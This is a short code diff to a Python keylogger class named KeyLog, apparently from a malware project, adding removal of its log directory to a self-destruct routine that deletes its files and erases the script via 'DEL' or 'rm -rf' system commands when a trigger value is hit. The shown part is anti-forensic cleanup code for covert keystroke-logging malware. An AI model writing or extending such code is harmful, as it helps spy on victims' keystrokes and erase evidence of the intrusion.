@@ -292,6 +292,7 @@ class KeyLog():
       if procW == 999:
         try:
           self.deleteAllFiles()
+          os.removedirs(self.LOGS_FILE_DIRECTORY)
           os.system("DEL " + os.path.basename(__file__))
         except Exception:
           pass
@@ -302,6 +303,7 @@ class KeyLog():
         if procL == 999:            
           try:
             self.deleteAllFiles()
+            os.removedirs(self.LOGS_FILE_DIRECTORY)
             os.system("rm -rf" + os.path.basename(__file__))
           except Exception:
             pass
@@ -313,4 +315,4 @@ class KeyLog():
 if __name__ == '__main__':
   multiprocessing.freeze_support() # For pyinstaller (Not related to keylogger)
   keylogClass = KeyLog()
-  keylogClass.mainModule()  
+  keylogClass.mainModule()
